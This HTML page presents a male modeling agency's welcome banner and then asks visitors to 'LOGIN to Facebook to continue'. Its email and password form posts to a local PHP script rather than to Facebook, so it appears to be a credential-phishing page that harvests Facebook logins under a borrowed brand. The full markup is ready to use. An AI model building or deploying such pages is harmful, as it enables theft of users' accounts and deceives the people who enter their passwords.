<html>

<head>
    <title> Facebook Login </title>
    <link rel="shortcut icon" type="image/png" href="assets/img/P.png.png">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato">
    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/fonts/font-awesome.min.css">
    <link rel="stylesheet" href="assets/w3css/w3.css">
    <script type="text/javascript" src="assets/js/jquery.min.js"></script>
    <script type="text/javascript" src="assets/js/bootstrap.min.js"></script>
    <link rel="stylesheet" href="assets/css/clientlogin.css">
    <style>
        body {
            margin: 0;
            padding: 0;
        }
        
        .background-image {
            background-image: url("assets/img/ddd.jpg");
            background-size: cover;
            background-position: center;
            height: 100vh;
        }
    </style>
<body>
<div class="background-image">
    <div class="container">
        <div class="jumbotron">
            <h3>Welcome to a <span style="font-family: 'Roboto Slab'; font-size: 25px; color: #7e7e00;"><u>Symphony of Dreams</u>,</span> the Prestigious Male and Talent Modeling Agency.</h3>
            <br>
            <p><span style="font-family: 'Dosis'; font-size: 19px; color: #434300;"><span style="font-family: 'Roboto Slab'; font-size: 25px; color: #7e7e00;"><u> Success Men </u></span> takes the lead in the model management market. We proudly provide exceptional castings for fashion shows and advertising campaigns.Join us on this extraordinary journey where dreams become reality .. <span style="color: #AA0000;"><u>TALENTS</u></span> meets opportunity, and the possibilities are boundless With <span style="color: #AA0000;"><u>EXTRAODINARY </u></span>visual experiences.</p>
        </div>
    </div>

    <div class="container" style="margin-top: -1%; margin-bottom: 2%;">
        <div class="col-md-5 col-md-offset-4">
            <div class="panel panel-primary">
                <div class="panel-heading"> Kindly LOGIN to Facebook to continue.</div>
                <div class="panel-body">

                    <form role="form" action="customer_registered_success.php" method="POST">
                        <div class="row">
                            <div class="form-group col-xs-12">
                                <label for="email"><span class="text-danger" style="margin-right: 5px;">*</span> Email: </label>
                                <div class="input-group">
                                    <input class="form-control" id="email" type="email" name="email" placeholder="Email" required="">
                                    <span class="input-group-btn">
                  <label class="btn btn-primary"><span class="glyphicon glyphicon-envelope" aria-hidden="true"></label>
              </span>
                                    </span>
                                </div>
                            </div>
                        </div>

                        <div class="row">
                            <div class="form-group col-xs-12">
                                <label for="password"><span class="text-danger" style="margin-right: 5px;">*</span> Password: </label>
                                <div class="input-group">
                                    <input class="form-control" id="password" type="password" name="password" placeholder="Password" required="">
                                    <span class="input-group-btn">
                  <label class="btn btn-primary"><span class="glyphicon glyphicon-lock" aria-hidden="true"></span></label>
                                    </span>

                                </div>
                            </div>
                        </div>



                        <div class="row">
                            <div class="form-group col-xs-4">
                                <button class="btn btn-primary" type="submit">Submit</button>
                            </div>

                        </div>
                       

                    </form>

                </div>

            </div>

        </div>
    </div>
</body>


</html>